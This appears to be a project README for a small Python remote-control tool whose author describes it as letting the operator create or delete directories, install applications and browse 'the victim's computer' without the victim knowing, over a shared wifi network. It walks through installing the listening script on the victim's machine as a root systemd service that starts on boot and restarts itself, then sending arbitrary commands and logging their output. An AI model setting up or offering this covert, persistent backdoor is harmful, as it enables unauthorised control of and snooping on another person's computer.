This repository is a cyber security project of mine, it is not very comprehensive yet it is effective, it allows you to do various operations without the victim knowing. You can create or remove directories, install applications and browse the victim's computer. Only drawback is you have to be in the same wifi with the victim.
You can set this up by following the steps I provided.

Requirements

To run this project, you will need the following:

Python 3.x installed on both the server and client machines.
SQLite3 (included with Python).
Basic knowledge of using a terminal or command line interface.

Files Included

client.py: The client script to send commands to the server.
server.py: The server script to receive and execute commands.
createDb.py: A script to create the SQLite database and table.
view_Db.py: A script to view the contents of the database.
command_outputs.db: The SQLite database where command outputs are stored. (you should run the createDb.py on the terminal for this to show up) -> Windows: python createDb.py Linux/Mac: python3 createDb.py

Step 1: Edit client.py

In the client.py file, update the IP address to the IP address of the server machine (victim's machine): client_socket.connect(('192.168.169.117', 12345)) #Example


Step 2: Run createDb.py

Run the create_db.py script on the client machine to create the SQLite database and table: python3 create_db.py


Step 3.1: Setup the Server

On the server machine, create a systemd service to ensure the server script runs on boot: sudo nano /etc/systemd/system/server.service


3.2: Add the following content to the file

[Unit]
Description=Start Server Script
After=network.target

[Service]
ExecStart=/usr/bin/python3 /path/to/server.py
WorkingDirectory=/path/to/
StandardOutput=inherit
StandardError=inherit
Restart=always
User=root

[Install]
WantedBy=multi-user.target

Replace /path/to/ with the actual path where server.py is located.


3.3: Reload the systemd daemon and start the service:
sudo systemctl daemon-reload
sudo systemctl start server.service
sudo systemctl enable server.service


Step 4: Running the Client

Run the command 'python3 client.py' on your terminal while you are on your projects directory -> .../Desktop/client.py
Enter the command you want to execute on the server machine. The output will be displayed and stored in the SQLite database.


Step 5: Reviewing the Database

To view the contents of the database, run the viewDb.py script on the client machine: python3 view_db.py
This will print the stored command outputs.


That's all, you can find more commands for your needs in the text file I added named 'serverServiceCommand.txt' 
